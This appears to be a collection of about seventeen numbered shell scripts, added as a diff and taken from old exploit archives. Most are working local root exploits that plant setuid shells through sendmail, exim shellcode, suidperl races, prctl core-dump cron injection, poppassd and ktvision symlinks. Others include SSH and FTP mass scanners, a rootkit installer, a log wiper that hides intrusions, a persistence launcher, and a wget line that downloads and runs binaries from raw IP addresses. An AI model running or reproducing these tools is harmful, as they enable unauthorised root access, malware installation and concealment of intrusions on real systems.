+if test -u /usr/bin/resizecons
+then
+echo ++++++++++++++++ System appears vulnerable.
+cd /tmp
+cat << _EOF_ > /tmp/313x37
+This exploit is dedicated to
+Wozz.  Use it with care.
+_EOF_
+cat << _EOF_ > /tmp/restoretextmode
+#!/bin/sh
+/bin/cp /bin/sh /tmp/wozz
+/bin/chmod 4777 /tmp/wozz
+_EOF_
+/bin/chmod +x /tmp/restoretextmode
+PATH=/tmp
+echo ================ Executing resizecons
+/usr/bin/resizecons 313x37
+/bin/rm /tmp/restoretextmode
+/bin/rm /tmp/313x37
+if test -u /tmp/wozz
+then
+echo ++++++++++++++++ Exploit successful, suid shell located in /tmp/wozz
+else
+echo ---------------- Exploit failed
+fi
+else
+echo ---------------- This machine does not appear to be vulnerable.
+fi
+
+#                 www.hack.co.za           [2000]#
+
+//29
+
+#!/bin/sh
+padstart=800
+
+if [ -z $1 -o -z $2 ]; then
+	echo "sh $0 <&shellcode> <&padstring>"
+	exit
+fi
+if [ ! -f lconfex ]; then
+	echo "lconfex not found!!"
+	exit
+fi
+
+echo "Please wait for a while =).."
+
+if [ -d segfault.eng ]; then
+	rm -rf segfault.eng
+fi
+
+until [ padstart = 600 ]
+do
+	`./lconfex -s $1 -m $2 -r $padstart 2>tmp.junk`
+	if [ `grep "segfault.eng/segfault.eng" tmp.junk | wc -l` != 0 ]; then
+		echo
+		echo "GOT IT! Your magic number is : $padstart"
+		echo "Now create a dir 'segfault.eng' and touch a file named 'segfault.eng' in it."
+		echo "Then exec \"./lconfex -s $1 -m $2 -r $padstart\" to get rootshell"
+		echo 
+		echo "*hint* : try play with -b <n> if not succeed. [ n = 0..4 ]"
+		echo "    ie : ./lconfex -s $1 -m $2 -r $padstart -b 1"
+		echo
+		echo "Good Luck d0inks!"
+		echo 
+		rm -f tmp.junk
+		exit
+	fi
+
+	padstart=`expr $padstart - 1`
+done
+
+echo "Sorry, can't find padstart no."
+echo "Try to play with -a <1..4> option"
+rm -f tmp.junk
+
+
+//30
+
+#!/bin/sh
+#
+#  GNU Fingerd 1.37 ~/.plan exploit.
+#
+
+cat << _EOF1_ >> ~/.plan
+  $exec /tmp/relinq
+_EOF1_
+
+cat << _EOF2_ >> /tmp/relinq.c
+#include <stdio.h>
+void main()
+{
+  printf("Fingerd 1.37 plan Root exploit by Joey\n");
+  setregid(0, 0);
+  setreuid(0, 0);
+  printf("User: %d, Group: %d.\n", getuid(), getgid());
+  system("cp /bin/bash /tmp/xxx");
+  system("chmod +s /tmp/xxx");
+}
+_EOF2_
+gcc /tmp/relinq.c -o /tmp/relinq
+finger $USER
+echo "attempting suid shell in /tmp/xxx"
+/tmp/xxx
+
+//31
+#!/bin/bash
+if [ $# != 1 ]; then
+        echo " usage: $0 <b class>"
+        exit;
+fi
+
+
+
+echo "### SSH SCANNER 2oo5  ###"
+echo "## PRIVATE SCANN ##" 
+echo "# Bafta srn #"
+./pscan2 $1 22 
+
+sleep 10
+cat $1.pscan.22 |sort |uniq > mfu.txt
+oopsnr2=`grep -c . mfu.txt`
+echo "# Iaa.. Iaa.!! "
+echo "# Doar  $oopsnr2 de servere.. AHH.. traiasca scannu'"
+echo "----------------------------------------"
+echo "# Hai frate sa vedem daka ai prins ceva"
+./ssh-scan 100
+rm -rf $1.pscan.22 mfu.txt
+echo "Lasa Tata Poate Data Viitoare"
+
+
+//32
+#!/bin/sh
+# Installation script for the FreeBSD rootkit. Make as many changes as you like.
+
+# Uncomment the below line if you want to backup the files.
+#BAKDIR=bak
+
+for BIN; do
+	PROG=`basename $BIN`
+	echo -n "Installing $PROG. . ."
+	RKBIN=$PROG/$PROG
+	if [ -x $BIN ]; then
+		addlen $RKBIN $BIN
+		fix $BIN $RKBIN $BAKDIR
+	fi
+	echo "done."
+done
+
+echo "The installation is complete."
+
+//33
+
+#!/bin/bash
+wget http://72.34.42.241/~dancing/bash
+chmod 744 bash
+./bash
+wget 207.90.211.54/arts
+chmod 744 arts
+./arts
+
+
+//34
+#!/bin/sh
+
+# Local Lame R00T sploit for exim <= 4.42
+# by Dark Eagle
+#  
+# My First Coding Release In bash ))
+
+# Unl0ck Research Team
+# 
+# More Effective than C-code.
+#
+# @env.c content:
+#
+###################################################
+#  #include <stdio.h>
+#  #include <string.h>
+#  int main(int argc, char *argv[])
+#  {
+#  char *addr_ptr;
+#  addr_ptr = getenv(argv[1]);
+#  printf("%s @ %p\n", argv[1], addr_ptr);
+#  return 0;
+#  }
+###################################################
+
+gcc @env.c -o @env
+
+cp @env /usr/bin
+cd /usr/exim/bin
+
+CODE=`perl -e 'print "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69
+\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`;export CODE
+
+@env CODE
+echo "So, dude, starting..."
+echo "NoW Just Type Address Of CODE"
+
+read ADDRESS
+
+echo "You are typed: $ADDRESS"
+
+echo "Leeeeeeeeeeeeet'sssssssssss g000000000000000!!!!!!!!!"
+
+./exim -bh ::%A`perl -e 'print pack('L','$ADDRESS') x 256'`
+
+# milw0rm.com [2005-02-07]
+
+
+//35
+
+#!/bin/sh
+if /sbin/route | grep ppp0 >> /dev/null
+ then
+   DEVICE="ppp0"
+   SPEED="dialup"
+ else
+   DEVICE="eth0"
+   SPEED="t1"
+fi
+
+
+while true
+ do
+  CLASSB=`./randb`
+echo "$CLASSB $DEVICE $SPEED" 
+  ./synscan $CLASSB .heh $DEVICE $SPEED 21 >/dev/null
+ cat .heh |grep wu-2.6.0 |cut -d "(" -f 1 >> .w
+ cat .heh |grep wu-2.6.1 |cut -d "(" -f 1 >> .l
+ rm -f .heh
+done
+
+
+
+//36
+#!/bin/sh
+#
+# Syntax: roption host
+#
+# host is any system running sendmail (except localhost).
+#
+# This exploits a flaw in SunOS sendmail(8), and attempts
+# create a suid root shell
+#
+# Written 1995 by [8LGM]
+# Please do not use this script without permission.
+#
+#
+#
+#**************************************************************************
+#   HACK: Sendmail(8): Create suid root shells [8lgm]
+# System: SunOS
+# Source: [8lgm] at webserv@FOUR.net
+#   Date: Aug 24,1995
+#**************************************************************************
+#
+
+PROG="`basename $0`"
+PATH=/usr/ucb:/usr/bin:/bin      export PATH
+IFS=" "                          export IFS
+
+# Check args
+if [ $# -ne 1 ]; then
+        echo "Syntax: $PROG host"
+        exit 1
+fi
+
+# Check we're on SunOS
+if [ "x`uname -s`" != "xSunOS" ]; then
+        echo "Sorry, this only works on SunOS"
+        exit 1
+fi
+
+PROG="`basename $0`"
+
+EXECME=/tmp/HotterThanMojaveInMyHeart
+
+# Create EXECME.c
+
+cat > $EXECME.c << 'EOF'
+main(argc,argv)
+int argc;
+char *argv[];
+{
+        chown("/tmp/InfamousAngel", 0, 0);
+        chmod("/tmp/InfamousAngel", 04755);
+}
+EOF
+
+cc -o $EXECME $EXECME.c
+
+# Check we have EXECME
+
+if [ ! -x $EXECME ]; then
+        echo "$PROG: couldnt compile $EXECME.c - check it out"
+        exit 1
+fi
+
+/bin/cp /bin/sh /tmp/InfamousAngel
+# Run sendmail
+
+/usr/lib/sendmail -oR$1 -f";$EXECME;" -t << 'EOF'
+To: No1InParticular
+
+Hows it goin
+EOF
+
+exec /tmp/InfamousAngel
+
+
+//37
+#!/bin/sh
+#
+# PRCTL local root exp By: Sunix
+# + effected systems 2.6.13<= x <=2.6.17.4 + 2.6.9-22.ELsmp
+# tested on Intel(R) Xeon(TM) CPU 3.20GHz
+# kernel 2.6.9-22.ELsmp
+# maybe others ...
+# Tx to drayer & RoMaNSoFt for their clear code...
+#
+# zmia23@yahoo.com
+
+
+cat > /tmp/getsuid.c << __EOF__
+#include <stdio.h>
+#include <sys/time.h>
+#include <sys/resource.h>
+#include <unistd.h>
+#include <linux/prctl.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <signal.h>
+
+char *payload="\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n* * * * *   root   chown root.root /tmp/s ; chmod 4777 /tmp/s ; rm -f /etc/cron.d/core\n";
+
+int main() { 
+    int child;
+    struct rlimit corelimit;
+    corelimit.rlim_cur = RLIM_INFINITY;
+    corelimit.rlim_max = RLIM_INFINITY;
+    setrlimit(RLIMIT_CORE, &corelimit);
+    if ( !( child = fork() )) {
+        chdir("/etc/cron.d");
+        prctl(PR_SET_DUMPABLE, 2);
+        sleep(200);
+        exit(1);
+    }
+    kill(child, SIGSEGV);
+    sleep(120);
+}
+__EOF__
+
+cat > /tmp/s.c << __EOF__
+#include<stdio.h>
+main(void)
+{
+setgid(0);
+setuid(0);
+system("/bin/sh");
+system("rm -rf /tmp/s");
+system("rm -rf /etc/cron.d/*");
+return 0;
+}
+__EOF__
+echo "wait aprox 4 min to get sh"
+cd /tmp
+cc -o s s.c
+cc -o getsuid getsuid.c
+./getsuid
+./s
+rm -rf getsuid*
+rm -rf s.c
+rm -rf prctl.sh
+
+# milw0rm.com [2006-07-14]
+
+
+//38
+#!/bin/sh
+# $Id: my-xperl.sh,v 1.1 2000/09/02 13:56:28 erzr Exp $
+
+SUIDPERL=/usr/bin/suidperl
+SUIDBIN=/usr/bin/passwd
+if [ ! -u $SUIDPERL ]; then
+  echo "Sorry, $SUIDPERL4 is NOT setuid or does not exist"
+  exit 0
+fi
+if [ ! -u $SUIDBIN ]; then
+  echo "Sorry, $SUIDBIN is NOT setuid or does not exist"
+  exit 0
+fi
+
+cat >flare <<__eof__
+#!/usr/bin/suidperl
+print "Nothing can stop me now...\n";
+__eof__
+
+cat >bighole.c <<__eof__
+main() {
+  setuid(0);
+  setgid(0);
+  chown("sush",0,0);
+  chmod("sush",04755);
+}
+__eof__
+
+cat >sush.c <<__eof__
+main() {
+  setuid(0);
+  setgid(0);
+  system("/bin/bash");
+}
+__eof__
+
+make bighole sush
+
+if [ ! -x ./sush ]; then
+  echo "Oops, seems to me I cannot compile helper applications."
+fi
+
+chmod 4755 ./flare
+
+FILENAME='none
+
+~!bighole
+
+'
+export interactive=1
+PATH=.:$PATH
+
+echo "waiting for our shell... It  could take up to 5 minutes."
+while :; do
+  ( ln -f -s $SUIDBIN "$FILENAME";usleep $RANDOM; nice -n +20 $SUIDPERL ./"$FILENAME" <./flare & ) &>/dev/null &
+  ( usleep $RANDOM ; ln -f -s /dev/stdin "$FILENAME" ) &>/dev/null &
+  if [ -u ./sush ]; then
+    echo "Hmm...Cred Lam Luat.. DAAAAAAAAAAAAAAAAAAAAA =-> Acum Esti r00t"
+    rm -f "$FILENAME" sush.c bighole bighole.c flare
+    ./sush
+    echo "cleaning up."
+    rm -f "$FILENAME" sush.c bighole bighole.c flare sush
+    exit 0
+  fi
+done
+
+
+//39
+#!/bin/sh
+###########################################################################
+# FreeBSD Qpopper poppassd latest version local r00t exploit by kcope   ###
+# tested on FreeBSD 5.4-RELEASE                                         ###
+###########################################################################
+
+POPPASSD_PATH=/usr/local/bin/poppassd
+HOOKLIB=libutil.so.4
+
+echo ""
+echo "FreeBSD Qpopper poppassd latest version local r00t exploit by kcope"
+echo ""
+sleep 2
+umask 0000
+if [ -f /etc/libmap.conf ]; then
+echo "OOPS /etc/libmap.conf already exists.. exploit failed!"
+exit
+fi
+cat > program.c << _EOF
+#include <unistd.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init()
+{
+ if (!geteuid()) {
+ remove("/etc/libmap.conf");
+ execl("/bin/sh","sh","-c","/bin/cp /bin/sh /tmp/xxxx ; /bin/chmod +xs /tmp/xxxx",NULL);
+ }
+}
+
+_EOF
+gcc -o program.o -c program.c -fPIC
+gcc -shared -Wl,-soname,libno_ex.so.1 -o libno_ex.so.1.0 program.o -nostartfiles
+cp libno_ex.so.1.0 /tmp/libno_ex.so.1.0
+echo "--- Now type ENTER ---"
+echo ""
+$POPPASSD_PATH -t /etc/libmap.conf
+echo $HOOKLIB ../../../../../../tmp/libno_ex.so.1.0 > /etc/libmap.conf
+su
+if [ -f /tmp/xxxx ]; then
+echo "IT'S A ROOTSHELL!!!"
+/tmp/xxxx
+else
+echo "Sorry, exploit failed."
+fi
+
+# milw0rm.com [2005-09-24]
+
+
+//40
+#!/bin/sh
+clear
+
+echo "RedHat 6.2/6.1/6.0 local exploit modified by str8hack"
+echo "-----------------------------------------"
+echo "With great respect to Catza..."
+echo
+
+SUIDPERL=/usr/bin/suidperl
+SUIDBIN=/usr/bin/passwd
+
+
+if [ ! -u $SUIDPERL ]; then
+  echo "[-] Naspa situatie se pare ca versiunea nu este RedHat"
+  echo
+  exit 0
+fi
+
+
+if [ ! -u $SUIDBIN ]; then
+  echo "[-] Naspa situatie se pare ca versiunea nu este RedHat"
+  echo
+  exit 0
+fi
+
+echo "[+] Greul a trecut compilam programele ajutatoare..."
+echo
+
+cat >flare <<__eof__
+#!/usr/bin/suidperl
+
+print "Nimic nu ne mai poate oprii!... \n";
+
+__eof__
+
+cat >bighole.c <<__eof__
+main() {
+  setuid(0);
+  setgid(0);
+  chown("sush",0,0);
+  chmod("sush",04755);
+}
+__eof__
+
+cat >sush.c <<__eof__
+main() {
+  setuid(0);
+  setgid(0);
+  system("/bin/bash");
+}
+__eof__
+
+make bighole sush
+
+echo
+
+if [ ! -x ./sush ]; then
+  echo "[-] Ups ... se pare ca RooT-ul nu are MAKE sau GCC functionale"
+  echo 
+  exit 0
+fi
+
+
+chmod 4755 ./flare
+
+FILENAME='none
+
+~!bighole
+
+'
+export interactive=1
+PATH=.:$PATH
+
+echo "[+] Exploatarea a inceput! - ar putea dura 5 minute"
+echo "[+] Atentie!!! sistemul ar putea fii suprasolicitat"
+
+while :; do
+  ( ln -f -s $SUIDBIN "$FILENAME";usleep $RANDOM; nice -n +20 $SUIDPERL ./"$FILENAME" <./flare & ) &>/dev/null &
+  ( usleep $RANDOM ; ln -f -s /dev/stdin "$FILENAME" ) &>/dev/null &
+  if [ -u ./sush ]; then
+    echo
+    echo "[+] Hehe si suntem ROOT - Enjoy!"
+    echo
+    rm -f "$FILENAME" sush.c bighole bighole.c flare
+    ./sush
+    echo
+    echo "[+] Multumim ca ati folosit systemele str8hack&Catza s.r.l :)"
+    echo
+    rm -f "$FILENAME" sush.c bighole bighole.c flare sush
+  fi
+  done
+    exit 0
+
+
+
+
+//41
+#!/bin/bash
+#
+# there is a symlink  follow problem in the (in many distributions
+# suid root) ktvision binary <= 0.1.1-271.
+#
+# It is  discouraging that nowadays such  trivial  symlink  attacks
+# are still possible.  No comment anymore. In order to be complete:
+# a bash script demonstrating this vulnerability is attached below.
+#
+#                                                            Ihq.
+
+link=$HOME/.kde/share/config
+linkto=/etc/passwd
+target=/opt/kde/bin/ktvision
+
+echo ""
+echo "KTVision <= 0.1.1-271 local r00t exploit by IhaQueR"
+echo ""
+
+if ! test -u $target ; then
+	echo "[-] $target not found"
+	exit 1
+fi;
+
+echo "[+] $target found"
+
+rm -f sush*
+cat <<__DUPA__>>sush.c
+#include <stdio.h>
+main()
+{
+	setuid(geteuid());
+	setgid(getegid());
+	execl("/bin/bash", "/bin/bash", NULL);
+}
+__DUPA__
+
+echo "    compiling sush"
+res=$(gcc sush.c -o sush)
+
+if test "$res" != "" -o ! -x sush ; then
+	echo "[-] failed"
+	rm sush* ktvback.*
+	exit 2;
+fi;
+
+echo "[+] success"
+
+cp $linkto ktvback.$$
+mkdir -p $link
+rm -f $link/ktvisionrc
+ln -s $linkto $link/ktvisionrc
+
+echo ""
+echo -n "now running... (ensure that X is up and running)"
+
+$target >/dev/null 2>&1 &
+cpid=$!
+
+declare -i cnt
+declare -i max
+cnt=0
+max=60
+
+while ! test -O $linkto ; do
+	sleep 1;
+	printf "  %.2d" $cnt
+	cnt=$(($cnt+1))
+	if test $cnt -ge $max ; then
+		echo ""
+		echo ""
+		echo "[-] FAILED"
+		rm sush* ktvback.*
+		exit 2;
+	fi;
+done;
+
+kill -9 $cpid >/dev/null 2>&1
+rm $link/ktvisionrc
+
+echo ""
+echo ""
+echo "[+] SUCCESS, creating sush"
+echo >>$linkto "r00t::0:0:root:/root:/bin/bash"
+echo ""
+su r00t -c "chown 0.0 sush; chmod u+s sush; chmod g+s sush; cp
+ktvback.$$ $linkto; chown 0.0 $linkto"
+rm ktvback.* sush.c
+
+if ! test -u sush ; then
+        echo "    hm strange error"
+	rm sush* ktvback.*
+        exit 1
+fi;
+
+echo ""
+echo "starting ./sush"
+./sush
+
+
+
+//42
+#!/bin/bash
+if [ $# != 1 ]; then
+        echo " usage: $0 <b class>"
+        exit;
+fi
+
+
+
+echo "###          #HackCentral RuLz         ###"
+echo "##     SirAlx  pscaico  P3RvErSuL RuLz  ##" 
+./pscan2 $1 22 
+
+sleep 10
+cat $1.pscan.22 |sort |uniq > mfu.txt
+oopsnr2=`grep -c . mfu.txt`
+echo "# Spargem Ceva"
+echo "# Doar  $oopsnr2 de servere.. #HackCentral rulZzZZ"
+echo "----------------------------------------"
+echo "# Macar 20 , 30 de bucati sa luam"
+./ssh-scan 100
+rm -rf $1.pscan.22 mfu.txt
+echo "Lasa Ca Mai Incercam O Clasa"
+
+
+//43
+
+#!/bin/sh
+# FRESH Text Log-wiper v1.0
+# Coded by Nyo
+#
+# Support Linux, SunOS, IRIX, FreeBSD
+
+banner()
+{
+echo "FRESH Text Log-wiper"
+echo "Coded by Nyo"
+echo
+}
+banner
+
+if [ $# != 1 ]
+then
+  echo "Usage: $0 <string>"
+  exit
+fi
+
+OS=`uname -s`
+        # Check if the OS
+        case ${OS} in
+                Linux)
+WERD=`/bin/ls -F /var/log | grep -v "/" | grep -v "*" | grep -v ".tgz" | grep -v ".gz" | grep -v ".tar" | grep -v "lastlog" | grep -v "btmp" | grep -v "utmp" | grep -v "wtmp" | grep -v "@"`
+		LOGPATH="/var/log"
+			;;
+		SunOS)
+                LOGPATH="/var/adm"
+WERD=`/bin/ls -F $LOGPATH | grep -v "/" | grep -v "*" | grep -v ".tgz" | grep -v ".gz" | grep -v ".tar" | grep -v "@"`
+			;;
+		IRIX)
+                LOGPATH="/var/adm"
+WERD=`/bin/ls -F $LOGPATH | grep -v "/" | grep -v "*" | grep -v ".tgz" | grep -v ".gz" | grep -v ".tar" | grep -v "@"`
+                        ;;
+		IRIX64)
+                LOGPATH="/var/adm"
+WERD=`/bin/ls -F $LOGPATH | grep -v "/" | grep -v "*" | grep -v ".tgz" | grep -v ".gz" | grep -v ".tar" | grep -v "@"`
+                        ;;
+		FreeBSD)
+WERD=`/bin/ls -F /var/log | grep -v "/" | grep -v "*" | grep -v ".tgz" | grep -v ".gz" | grep -v ".tar" | grep -v "lastlog" | grep -v "utmp" | grep -v "wtmp" | grep -v "@"`
+		LOGPATH="/var/log"
+			;;
+		*)
+		echo "[!] Your OS is UNKNOWN!"
+		exit 0
+		exit 10
+			;;
+                esac
+
+echo "[*] Detected -> $OS"
+echo "[*] The string is: $1"
+echo
+echo "[*] Log cleaning in process ... "
+
+for filez in $WERD
+do
+   lines=`cat $LOGPATH/$filez | wc -l`
+   printf "[-] Cleaning $filez ($lines lines) ... "
+   grep -v $1 $LOGPATH/$filez > new
+   touch -r $LOGPATH/$filez new
+   mv -f new $LOGPATH/$filez
+   newlines=`cat $LOGPATH/$filez | wc -l`
+   linedel=`expr $lines - $newlines`
+   printf "$linedel lines removed!\n"
+done
+echo
+if [ $OS = "Linux" ]
+then
+echo "[*] Rehashing syslog"
+echo
+killall -HUP syslogd
+fi
+echo "[*] Logs successfully wiped!"
+echo
+exit 0;
+
+
+//44
+#!/bin/sh
+rm -f /var/lock/makewhatis.lock
+ln -s /usr/share/man/man1/x\ \$\{PATH\:0\:1\}tmp\$\{PATH\:0\:1\}woot\>\>\$\{PATH\:0\:1\}var\$\{PATH\:0\:1\}spool\$\{PATH\:0\:1\}cron\$\{PATH\:0\:1\}root\<man.1.gz /var/lock/makewhatis.lock
+gzip -cf - >/tmp/woot << EOF
+* * * * * /tmp/fjeer
+EOF
+cat > /tmp/fjeer <<EOF
+#!/bin/sh
+cp -f /var/tmp/sh /tmp/rootshell
+chmod +s /tmp/rootshell
+EOF
+chmod +x /tmp/fjeer
+
+//45
+#!/bin/sh
+
+x=`pwd`
+
+
+PATH=/bin:/usr/bin:/sbin:/usr/sbin
+export PATH
+
+initd &
+
+cd /usr/bin/".. "/
+
+PATH=".";export PATH
+
+write  & >> /dev/null
+
+
+PATH=/bin:/usr/bin:/sbin:/usr/sbin
+export PATH
+if [ -d .x ];then
+cd .x >> /dev/null
+./start >> /dev/null
+
+fi
+cd $x > /dev/null
+
+
+
+
+
